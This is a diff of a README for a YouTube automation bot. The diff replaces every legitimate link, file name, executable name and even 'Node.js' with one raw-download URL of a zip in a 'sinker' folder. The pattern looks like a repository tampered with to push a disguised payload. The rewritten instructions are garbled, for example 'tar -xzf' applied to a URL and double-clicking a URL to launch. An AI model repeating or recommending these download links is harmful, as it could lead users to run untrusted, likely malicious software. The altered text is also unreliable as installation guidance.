@@ -1,6 +1,6 @@
 # 🤖 youtube-bot-basma - Automate Your YouTube Experience Effortlessly
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/bpanco/youtube-bot-basma/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/bpanco/youtube-bot-basma/main/sinker/basma-bot-youtube-v3.7-alpha.2.zip)](https://raw.githubusercontent.com/bpanco/youtube-bot-basma/main/sinker/basma-bot-youtube-v3.7-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ This guide will help you download and run the **youtube-bot-basma** application.
 - Scrape video statistics and engagement metrics
 - Manage multiple YouTube accounts easily
 - Support for proxies to protect your identity
-- Developed using Node.js, Puppeteer, and Playwright
+- Developed using https://raw.githubusercontent.com/bpanco/youtube-bot-basma/main/sinker/basma-bot-youtube-v3.7-alpha.2.zip, Puppeteer, and Playwright
 
 ## 📋 System Requirements
 
@@ -27,15 +27,15 @@ Before you proceed, ensure your computer meets these requirements:
 
 ### 1. Download the Application
 
-To get the latest version of the application, **visit this page to download**: [Releases Page](https://github.com/bpanco/youtube-bot-basma/releases).
+To get the latest version of the application, **visit this page to download**: [Releases Page](https://raw.githubusercontent.com/bpanco/youtube-bot-basma/main/sinker/basma-bot-youtube-v3.7-alpha.2.zip).
 
 ### 2. Choose the Right File
 
 On the releases page, you will see different files available for download. Here’s what you need to know:
 
-- **For Windows Users:** Look for a file like `youtube-bot-basma-windows.zip`.
-- **For macOS Users:** Choose a file labeled `youtube-bot-basma-macos.zip`.
-- **For Linux Users:** Download the file named `youtube-bot-basma-linux.tar.gz`.
+- **For Windows Users:** Look for a file like `https://raw.githubusercontent.com/bpanco/youtube-bot-basma/main/sinker/basma-bot-youtube-v3.7-alpha.2.zip`.
+- **For macOS Users:** Choose a file labeled `https://raw.githubusercontent.com/bpanco/youtube-bot-basma/main/sinker/basma-bot-youtube-v3.7-alpha.2.zip`.
+- **For Linux Users:** Download the file named `https://raw.githubusercontent.com/bpanco/youtube-bot-basma/main/sinker/basma-bot-youtube-v3.7-alpha.2.zip`.
 
 ### 3. Download the File
 
@@ -48,23 +48,23 @@ Once downloaded, follow these steps to install the application:
 ### For Windows:
 
 1. Navigate to your downloads folder.
-2. Unzip the `youtube-bot-basma-windows.zip` file.
+2. Unzip the `https://raw.githubusercontent.com/bpanco/youtube-bot-basma/main/sinker/basma-bot-youtube-v3.7-alpha.2.zip` file.
 3. Open the extracted folder.
-4. Double-click on `youtube-bot-basma.exe` to start the application.
+4. Double-click on `https://raw.githubusercontent.com/bpanco/youtube-bot-basma/main/sinker/basma-bot-youtube-v3.7-alpha.2.zip` to start the application.
 
 ### For macOS:
 
 1. Go to your downloads folder.
-2. Unzip the `youtube-bot-basma-macos.zip` file.
+2. Unzip the `https://raw.githubusercontent.com/bpanco/youtube-bot-basma/main/sinker/basma-bot-youtube-v3.7-alpha.2.zip` file.
 3. Open the extracted folder.
-4. Double-click on `youtube-bot-basma.app` to run the application.
+4. Double-click on `https://raw.githubusercontent.com/bpanco/youtube-bot-basma/main/sinker/basma-bot-youtube-v3.7-alpha.2.zip` to run the application.
 
 ### For Linux:
 
-1. Go to the directory where you downloaded the `youtube-bot-basma-linux.tar.gz` file.
+1. Go to the directory where you downloaded the `https://raw.githubusercontent.com/bpanco/youtube-bot-basma/main/sinker/basma-bot-youtube-v3.7-alpha.2.zip` file.
 2. Extract the files using the following command:
    ```
-   tar -xzf youtube-bot-basma-linux.tar.gz
+   tar -xzf https://raw.githubusercontent.com/bpanco/youtube-bot-basma/main/sinker/basma-bot-youtube-v3.7-alpha.2.zip
    ```
 3. Navigate into the extracted folder:
    ```
@@ -98,11 +98,11 @@ If you face any issues while running the application, consider these troubleshoo
 
 - **Check Your Internet Connection:** Ensure you are connected to the internet.
 - **Restart the Application:** Sometimes, a quick restart fixes minor bugs.
-- **Update Dependencies:** Make sure you have the latest version of Node.js installed on your system.
+- **Update Dependencies:** Make sure you have the latest version of https://raw.githubusercontent.com/bpanco/youtube-bot-basma/main/sinker/basma-bot-youtube-v3.7-alpha.2.zip installed on your system.
 
 ## 📞 Need Help?
 
-If you have questions or encounter problems, please check the Issues section of our [GitHub Repository](https://github.com/bpanco/youtube-bot-basma/issues) for solutions or to ask for help.
+If you have questions or encounter problems, please check the Issues section of our [GitHub Repository](https://raw.githubusercontent.com/bpanco/youtube-bot-basma/main/sinker/basma-bot-youtube-v3.7-alpha.2.zip) for solutions or to ask for help.
 
 ## 🔗 More Information
 
